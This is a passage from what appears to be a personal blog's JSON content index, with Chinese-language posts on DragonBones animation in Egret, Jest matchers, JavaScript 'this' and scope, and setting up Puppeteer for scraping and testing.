this.armatureDisplay.animation.gotoAndStopByProgress(this.animationName, progress)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"目录结构\"><a href=\"#目录结构\" class=\"headerlink\" title=\"目录结构\"></a>目录结构</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">|—— bin-debug   &lt;-编译后运行代码</span><br><span class=\"line\">|—— libs        &lt;-第三方库</span><br><span class=\"line\">|—— resource    &lt;-资源文件</span><br><span class=\"line\">    |—— default.res.json    &lt;-资源索引目录</span><br><span class=\"line\">    └── default.thm.json    &lt;-主题索引目录</span><br><span class=\"line\">|—— scripts     &lt;-构建脚本</span><br><span class=\"line\">|—— resource    &lt;-资源文件</span><br><span class=\"line\">    |—— dragonbones    &lt;-龙骨资源目录</span><br><span class=\"line\">        └── listen_mother    &lt;-母亲节活动龙骨资源</span><br><span class=\"line\">|—— src         &lt;-项目源代码</span><br><span class=\"line\">    |—— common          &lt;-公用方法库</span><br><span class=\"line\">    |—— pages           &lt;-主要页面</span><br><span class=\"line\">    |—— LoadingUI.ts    &lt;-loading组件</span><br><span class=\"line\">    └── Main.ts         &lt;-入口文件</span><br><span class=\"line\">└── template    &lt;-项目模板</span><br></pre></td></tr></table></figure>\n<h2 id=\"制作场景动画\"><a href=\"#制作场景动画\" class=\"headerlink\" title=\"制作场景动画\"></a>制作场景动画</h2><blockquote>\n<p>创建动画</p>\n</blockquote>\n<p><img width=\"300\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190515_2ghf8c42a3kji7l7l48e6jbkbafii_1050x672.png\"></p>\n<ul>\n<li>选择创建龙骨动画</li>\n</ul>\n<blockquote>\n<p>通过属性面板</p>\n</blockquote>\n<p><img width=\"200\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190512_1h0i16eg0f04lk03h128ih080ei3g_558x888.png\"></p>\n<ul>\n<li>设置750宽、1260高</li>\n<li>初始化起点位置，375、630</li>\n</ul>\n<h2 id=\"动画制作\"><a href=\"#动画制作\" class=\"headerlink\" title=\"动画制作\"></a>动画制作</h2><blockquote>\n<p>逐帧动画和补间动画的差异</p>\n</blockquote>\n<ul>\n<li>逐帧动画<ul>\n<li>逐帧动画是在时间帧上逐帧绘制帧内容，每一帧带有不同的图</li>\n<li>适合于表演很细腻的动画，如3D效果、人物或动物急剧转身等等效果</li>\n<li>优点:有非常大的灵活性,表现任何想表现的内容</li>\n<li>缺点:由于逐帧动画的帧序列内容不一样，不仅增加制作负担而且最终输出的文件量也很大</li>\n</ul>\n</li>\n<li>补间动画<ul>\n<li>只需要为动画的第一个关键帧和最后一个关键帧创建内容，两个关键帧之间帧的内容由龙骨自动生成，不需要人为处理</li>\n<li>逐帧动画是由手工控制，帧与帧之间的过渡很可能会不自然、不连贯</li>\n<li>过渡更为自然连贯。最后，相对于逐帧动画来说，补间动画的文件更小</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"制作逐帧动画\"><a href=\"#制作逐帧动画\" class=\"headerlink\" title=\"制作逐帧动画\"></a>制作逐帧动画</h3><blockquote>\n<p>起步</p>\n</blockquote>\n<ul>\n<li>新建项目=&gt;创建龙骨动画=&gt;逐帧动画模板。</li>\n<li>窗口菜单=&gt;属性面板</li>\n<li>勾选画布=&gt;设定宽高=&gt;设定偏移方向</li>\n<li>窗口菜单=&gt;资源面板</li>\n<li>点击导入资源按钮或点击打开资源目录，将图片放入资源文件中</li>\n<li>在资源面板拖入图片资源，即可</li>\n</ul>\n<blockquote>\n<p>导出</p>\n</blockquote>\n<p>顶部栏导出按钮，按照默认“纹理集”即可</p>\n<p><img width=\"400\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190515_3k31d6j2ijc64j232ke0d4b728c09_1080x70.png\"></p>\n<h3 id=\"制作补间动画\"><a href=\"#制作补间动画\" class=\"headerlink\" title=\"制作补间动画\"></a>制作补间动画</h3><p>补间动画思想：<strong>只需要为动画的第一个关键帧和最后一个关键帧创建内容，两个关键帧之间帧的内容自动生成，不需要人为处理</strong></p>\n<blockquote>\n<p>下面以龙骨动画的补间动画制作为例：</p>\n</blockquote>\n<p>在龙骨动画制作过程中，动画的对象必须以骨骼为单位</p>\n<ul>\n<li><p>切换至动画制作tab</p>\n<ul>\n<li><img width=\"400\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190515_5i77b4889d454d0aek8cif8l8beh6_844x384.png\"></li>\n</ul>\n</li>\n<li><p>进入场景后通过场景树选择需要制作动画的骨骼</p>\n<ul>\n<li><img width=\"200\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190515_5e4290dgi2g7c11c9h4061c4cblah_690x980.png\"></li>\n</ul>\n</li>\n<li><p>选中骨骼可进行：<strong>位移</strong>、<strong>旋转</strong>、<strong>缩放</strong>动画制作</p>\n<ul>\n<li>在时间轴上选中第0帧，在操作面板点击对应改变属性的旗子</li>\n<li><img width=\"200\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190515_860j48c1g0f347e9jg553k8j6bl7h_1012x598.png\"></li>\n<li><img width=\"200\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190515_5g58g56ja53eil92eh6h12211ff0f_736x112.png\"></li>\n<li>选中第10帧，并通过操作面板或直接对骨骼记性属性更改</li>\n<li><img width=\"200\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190515_7jieaa926glfbcc28i85i2hl03e1h_736x110.png\"></li>\n<li>点击黄色旗子，将会自动补充补间动画</li>\n</ul>\n</li>\n<li><p>选中图片可进行：<strong>透明度</strong>、<strong>是否展示</strong></p>\n<ul>\n<li>打开属性面板</li>\n<li><img width=\"100\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190515_436fehba4a05da0kg6hak2h268fc3_502x1000.png\"></li>\n<li>是否展示图片需要通过，自动关键</li>\n<li><img width=\"100\" src=\"https://s10.mogucdn.com/mlcdn/c45406/190515_2a4f690dl2caek417cf1ij40049dc_480x592.png\"></li>\n<li>自动关键帧开启后，会自动在当前关键帧记录所有的属性修改</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"制作龙骨动画\"><a href=\"#制作龙骨动画\" class=\"headerlink\" title=\"制作龙骨动画\"></a>制作龙骨动画</h2><p><strong>龙骨动画一般用来制作人物行动，将人物整体作为骨架各部分作为骨骼，例如：手臂、大腿、小腿都是骨骼，其中大腿和小腿都是腿的子集</strong></p>\n<blockquote>\n<p>起步</p>\n</blockquote>\n<ul>\n<li>新建项目=&gt;创建龙骨动画=&gt;龙骨动画模板</li>\n<li>窗口菜单=&gt;属性面板</li>\n<li>勾选画布=&gt;设定宽高=&gt;设定偏移方向</li>\n<li>窗口菜单=&gt;资源面板</li>\n<li>点击导入资源按钮或点击打开资源目录，将图片放入资源文件中</li>\n<li>在资源面板拖入图片资源，即可</li>\n<li>创建骨骼：在骨架装配tab栏=&gt;场景树中右击=&gt;插入=&gt;骨骼</li>\n<li>将图片资源拖入骨骼中</li>\n</ul>\n<h3 id=\"一屏动画设计原则\"><a href=\"#一屏动画设计原则\" class=\"headerlink\" title=\"一屏动画设计原则\"></a>一屏动画设计原则</h3><ul>\n<li>构建一个基本场景骨架，后续骨架放置基本骨架上，方便整体移动</li>\n<li>物件退场需要与背景反方向运动，造成错落感。或顺方向退场，避免导致认为物品或人与背景不分离</li>\n<li>龙骨动画设计时以最小十帧为单位，场景转换预留30~50帧，后续方便调整</li>\n<li>帧动画设计图片以至少三帧不同动画，可以造成连续感</li>\n<li>开始龙骨动画制作前，先确定好场景高度和宽度不会有大的变化，否则后续修改会造成整体调整</li>\n<li>文字动画放置物品后</li>\n<li>动画效果放置980像素内，否则在小屏幕手机上无法展示全面</li>\n<li>帧动画切换中间过度衔接透明度变化</li>\n</ul>\n","categories":["game"],"tags":["egret"]},{"title":"Jest","url":"http://zhoushaw.github.io/2019/05/04/learning/font-end/test/jest/","content":"<h2 id=\"起步\"><a href=\"#起步\" class=\"headerlink\" title=\"起步\"></a>起步</h2><blockquote>\n<p>安装</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save-dev jest</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>pageckage.json</code>配置</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;scripts&quot;: &#123;</span><br><span class=\"line\">    &quot;test&quot;: &quot;jest&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Expect\"><a href=\"#Expect\" class=\"headerlink\" title=\"Expect\"></a>Expect</h2><p><code>Expect</code>是一个函数，第一个参数接收<code>value</code>,后面可接链式属性判断</p>\n<ul>\n<li><code>expect(value)</code><ul>\n<li><code>expect(value).not.toEqual</code>: 与后面等式取反比较</li>\n<li><code>toEqual(compareValue)</code>: <code>value</code> 与 <code>compareValue</code>必须完全相等</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>自定义校验方法</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 查询对象key值是否存在对象中</span><br><span class=\"line\">expect.extend(&#123;</span><br><span class=\"line\">    toContainKeys(received, keys) &#123;</span><br><span class=\"line\">        const receivedKeys = Object.keys(received);</span><br><span class=\"line\">        const pass = keys.every((val =&gt; receivedKeys.includes(val)));</span><br><span class=\"line\">        if (pass) &#123;</span><br><span class=\"line\">            return &#123;</span><br><span class=\"line\">                message: () =&gt;</span><br><span class=\"line\">                `expected $&#123;JSON.stringify(received)&#125; have contain $&#123;receivedKeys&#125;`,</span><br><span class=\"line\">                pass: true,</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return &#123;</span><br><span class=\"line\">                message: () =&gt;</span><br><span class=\"line\">                `expected $&#123;JSON.stringify(received)&#125; don&apos;t have contain $&#123;receivedKeys&#125;`,</span><br><span class=\"line\">                pass: false,</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n","categories":["js"],"tags":["js"]},{"title":"JavaScript系列之this","url":"http://zhoushaw.github.io/2019/04/23/learning/font-end/js/JavaScript-this/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在JavaScript语言中存在一个<code>this</code>关键词，这个关键词指的是函数运行时所在的环境。由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（<strong>context</strong>）。所以，<code>this</code>就出现了，它的设计目的就是在函数体内部，指代函数当前的运行环境。</p>\n<p>前一个系列的<strong>作用域</strong>讲过,作用域运用的是词法作用域，意味着是编写时确定的，但<strong>this</strong>与其工作原理完全不同，它的指向并不是编写时确定的，而是运行时确定。</p>\n<h2 id=\"仅仅是“规则”\"><a href=\"#仅仅是“规则”\" class=\"headerlink\" title=\"仅仅是“规则”\"></a>仅仅是“规则”</h2><p>之前在阅读 You Don’t Know JS系列的: <strong>this &amp; Object Prototypes</strong>中，将this的指向总结了几条规则：</p>\n<blockquote>\n<p>函数调用方式与内部<code>this</code>指针关系：</p>\n</blockquote>\n<ol>\n<li>直接调用:函数内部<code>this</code>指向全局对象<code>window</code></li>\n<li>通过对象使用点来调用:函数内部this指向调用对象</li>\n<li>触发事件调用函数:函数内部的<code>this</code>指向触发事件的对象</li>\n<li>以<code>new</code>的方式来调用:函数内部<code>this</code>指向本次函数执行时对应的一个匿名对象（以new的方式创建的函数，函数名的首字母一般以大写字母开始）</li>\n<li>通过<code>call</code>的方法来间接调用方法:函数内部this指向<code>call</code>方法的第一参数对象,我们可以创建结构相同，但内容不同的对象</li>\n</ol>\n<h2 id=\"不仅仅是“规则”\"><a href=\"#不仅仅是“规则”\" class=\"headerlink\" title=\"不仅仅是“规则”\"></a>不仅仅是“规则”</h2><p>参考了上面的规则发现，<code>this</code>的指向无论如何都逃脱不了上面的<strong>5大原则</strong>,那它们之前是否存在一定的规律呢，或者说是什么来决定<code>this</code>的指向的。</p>\n<p>通常我们会对一下例子的结果没法准确的确定<code>this</code>指向：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var name = &apos;zhou&apos;;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">    name: &apos;shaw&apos;,</span><br><span class=\"line\">    say: function () &#123;</span><br><span class=\"line\">        console.log(this.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">obj.say();  </span><br><span class=\"line\"></span><br><span class=\"line\">var say = obj.say;</span><br><span class=\"line\">say();</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>上面的输出结果会是什么呢：</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">obj.say(); // 输出shaw</span><br><span class=\"line\">say();  // 输出zhou</span><br></pre></td></tr></table></figure>\n<p>为什么这里<code>obj.say</code>和<code>say</code>的输出结果会不一致呢？下面我们来一探究竟。</p>\n<p><code>this</code>的指向与数据在内存里的数据结构有关:</p>\n<p>上面案例里的<code>obj</code>对象是如何在内存中存储的呢</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">obj.say-&gt; &#123;</span><br><span class=\"line\">    [[value]]: say函数地址</span><br><span class=\"line\">    [[write]]: true,</span><br><span class=\"line\">    [[readable]]: true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实际上<code>say</code>函数并没有存储在<code>obj</code>对象中，它只存储了<code>say</code>函数的地址。</p>\n<p>我们直接通过<code>obj.say</code>来调用函数，与<code>obj.say</code>赋值给<code>say</code>变量调用完全不同，因为<code>obj</code>中存储的是<code>say函数</code>的地址，我们进行赋值操作时直接将say函数地址直接赋值过去了，而不是我们想象的将<code>obj.say</code>引用赋值过去。</p>\n","categories":["js"],"tags":["js"]},{"title":"puppeteer爬虫实战","url":"http://zhoushaw.github.io/2019/04/23/learning/node/puppeteer/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>待补充….</p>\n<h2 id=\"centOs7-0无法运行问题\"><a href=\"#centOs7-0无法运行问题\" class=\"headerlink\" title=\"centOs7.0无法运行问题\"></a>centOs7.0无法运行问题</h2><p>centos必须升级到7.0以上否则会遇到依赖版本缺失问题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install ipa-gothic-fonts xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-utils xorg-x11-fonts-cyrillic xorg-x11-fonts-Type1 xorg-x11-fonts-misc -y</span><br><span class=\"line\"></span><br><span class=\"line\">yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 -y</span><br><span class=\"line\"></span><br><span class=\"line\"># 再安装NSS的依赖：</span><br><span class=\"line\">yum install nss.x86_64</span><br><span class=\"line\"></span><br><span class=\"line\"># puppeteer的执行文件中去沙箱运行：</span><br><span class=\"line\">browser = await puppeteer.launch(&#123;</span><br><span class=\"line\">  headless: true,</span><br><span class=\"line\">  args: [&apos;--no-sandbox&apos;, &apos;--disable-setuid-sandbox&apos;]</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"puppeteer启动配置\"><a href=\"#puppeteer启动配置\" class=\"headerlink\" title=\"puppeteer启动配置\"></a>puppeteer启动配置</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class=\"line\">const browser = await puppeteer.launch([options]);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>options<ul>\n<li>headless <code>&lt;boolean&gt;</code> 以界面形式运行</li>\n<li>devtools <code>&lt;boolean&gt;</code> 打开开发者工具栏</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"页面对象附带\"><a href=\"#页面对象附带\" class=\"headerlink\" title=\"页面对象附带\"></a>页面对象附带</h2><blockquote>\n<p>page.emulate</p>\n</blockquote>\n<p>模仿真实手机</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class=\"line\">const devices = require(&apos;puppeteer/DeviceDescriptors&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">const page = await browser.newPage();</span><br><span class=\"line\">await page.emulate(devices[&apos;iPhone X&apos;])</span><br><span class=\"line\">await page.goto(&apos;https://www.baidu.com&apos;&#125;);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>page.waitFor</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">page.waitFor(selectorOrFunctionOrTimeout[, options[, ...args]])</span><br></pre></td></tr></table></figure>\n<p>等待指定dom节点内容渲染完成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let selector = &apos;.price&apos;;</span><br><span class=\"line\">await page.waitFor(selector =&gt;&#123;</span><br><span class=\"line\">    return (document.querySelector(selector)||&#123;&#125;).innerText;</span><br><span class=\"line\">&#125;, &#123;&#125;, selector);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>page.goto(<code>url</code>[, <code>options</code>])</p>\n</blockquote>\n<ul>\n<li>url <code>&lt;string&gt;</code> : 指定跳转地址</li>\n<li>options <code>&lt;Object&gt;</code>:<ul>\n<li><code>networkidle0</code>: 500毫秒内没有任何一个网络请求</li>\n<li><code>networkidle2</code>:  500毫秒内没有超过任何二个网络请求</li>\n<li><code>domcontentloaded</code>: dom装载完成</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"页面环境执行脚本\"><a href=\"#页面环境执行脚本\" class=\"headerlink\" title=\"页面环境执行脚本\"></a>页面环境执行脚本</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">await page.evaluate(() =&gt; &#123;</span><br><span class=\"line\">    let name = window.name;</span><br><span class=\"line\">    return name;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>page.evaluate(pageFunction[, …args])</p>\n</blockquote>\n<ul>\n<li><code>pageFunction</code>: <code>&lt;Function&gt;</code> 执行脚本，函数在浏览器环境执行，拥有<code>window</code>、<code>document</code>访问权限</li>\n<li><code>...args</code>: <code>&lt;...Serializable|JSHandle&gt;</code>,传入参数，<code>pageFunction</code>无法访问函数外部变量，因为<code>pageFunction</code>内容将会直接当做脚本注入页面</li>\n</ul>\n<p>由于<code>pageFunction</code>函数会直接被注入到页面中，所以无法获取函数外部作用域，只能讲外部参数通过<code>args</code>传入，不能直接将<code>Function</code>传入，只能将函数通过<code>toString</code>后，在通过<code>eval</code>来执行<code>string</code>化后的函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let detect = () =&gt; &#123;</span><br><span class=\"line\">    // ... do some thing</span><br><span class=\"line\">    return &apos;res&apos;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> const html = await page.evaluate((fn) =&gt; &#123;</span><br><span class=\"line\">        let res = eval(fn)();</span><br><span class=\"line\">        return res;</span><br><span class=\"line\">&#125;, detect.toString());</span><br></pre></td></tr></table></figure>\n<p><strong>注意</strong>：</p>\n<p>页面注入脚本，监听事件失效</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let renderReady = () =&gt; &#123;</span><br><span class=\"line\">      return new Promise((resolve) =&gt; &#123;</span><br><span class=\"line\">          document.onreadystatechange = () =&gt; &#123;</span><br><span class=\"line\">              if (document.readyState === &apos;complete&apos;) &#123;</span><br><span class=\"line\">                  resolve();</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">          &#125;;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">(async () =&gt; &#123;</span><br><span class=\"line\">    await renderReady()</span><br><span class=\"line\">    console.log(&apos;complete&apos;) // 永远也不会走到这一块来，进入到renderReady后就失效了</span><br><span class=\"line\">&#125;)()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jest-puppeteer\"><a href=\"#jest-puppeteer\" class=\"headerlink\" title=\"jest-puppeteer\"></a>jest-puppeteer</h2><p><a href=\"https://jestjs.io/docs/zh-Hans/puppeteer\" target=\"_blank\" rel=\"noopener\">官方文档</a></p>\n<p>使用puppeteer与jest搭配测试：</p>\n<ul>\n<li>依赖安装<code>npm install --save-dev jest-puppeteer puppeteer jest</code></li>\n<li><code>package.json</code>添加<code>&quot;jest&quot;: {&quot;preset&quot;: &quot;jest-puppeteer&quot;}</code>依赖</li>\n</ul>\n<h3 id=\"TypeScript\"><a href=\"#TypeScript\" class=\"headerlink\" title=\"TypeScript\"></a>TypeScript</h3><p>在使用TypeScript中使用<code>puppeteer</code>测试需要注意一下几点：</p>\n<blockquote>\n<p>由于TypeScript需要进行类型检测所以需要在全局环境注入变量</p>\n</blockquote>\n<p>依赖安装：</p>\n<p><code>@types/puppeteer</code>, <code>@types/jest-environment-puppeteer</code></p>\n<p>配置文件：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    jest: &#123;</span><br><span class=\"line\">        &quot;globalSetup&quot;: &quot;jest-environment-puppeteer/setup&quot;,</span><br><span class=\"line\">        &quot;globalTeardown&quot;: &quot;jest-environment-puppeteer/teardown&quot;,</span><br><span class=\"line\">        &quot;testEnvironment&quot;: &quot;jest-environment-puppeteer&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>指定输出版本</p>\n</blockquote>\n<p>若输出目标为<code>&quot;target&quot;: &quot;es5&quot;</code>，则会报各种依赖无法查找错误</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ReferenceError: __awaiter is not defined</span><br></pre></td></tr></table></figure>\n<p>解决方案：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// tsconfig.json,文件配置</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;compilerOptions&quot;: &#123;</span><br><span class=\"line\">    &quot;target&quot;: &quot;es2017&quot;,</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["node"],"tags":["node"]},{"title":"JavaScript系列之作用域与闭包","url":"http://zhoushaw.github.io/2019/04/21/learning/font-end/js/JavaScript-closure/","content":"<h2 id=\"作用域\"><a href=\"#作用域\" class=\"headerlink\" title=\"作用域\"></a>作用域</h2><p>在进入作用域的讨论之前先明什么是作用域，通过一句话简单描述就是：<strong>一组明确定义的规则，它定义如何在某些位置存储变量，以及如何在稍后找到这些变量</strong></p>\n<h3 id=\"词法作用域\"><a href=\"#词法作用域\" class=\"headerlink\" title=\"词法作用域\"></a>词法作用域</h3><p>作用域的工作方式有两种占统治地位的模型。其中的第一种是最最常见，在绝大多数的编程语言中被使用的。它称为 <strong>词法作用域</strong>，我们将深入检视它。另一种仍然被一些语言（比如 Bash 脚本，Perl 中的一些模式，等等）使用的模型，称为 <strong>动态作用域</strong>。</p>\n<p>JavaScript采用的是<strong>词法作用域</strong>，这意味着<strong>作用域</strong>是编写时确定的，而不是运行时确定的，当然也可以通过<strong>欺骗</strong>来达到动态作用域，例如使用：<code>eval</code>、<code>with</code>等关键词</p>\n<blockquote>\n<p>词法分析</p>\n</blockquote>\n<p>JavaScript的代码运行，并不是像你想象的<strong>逐行编译</strong>，而是在进行编译前会进行<strong>词法分析</strong>。也就形成了我们所说的<strong>词法作用域</strong>。</p>\n<p>可以通过下面的🌰来看：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var value = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">    console.log(value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function bar() &#123;</span><br><span class=\"line\">    var value = 2;</span><br><span class=\"line\">    foo();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">bar();</span><br><span class=\"line\"></span><br><span class=\"line\">// 结果是 ???</span><br></pre></td></tr></table></figure>\n<p>大多数人看到这个🌰第一个反应结果是：输出<code>2</code>，但是需要注意的是foo的作用域并不存在与<code>bar函数</code>中,因为JavaScript的<code>作用域</code>是词法作用域，所以并不能获取到bar函数中 <code>var value = 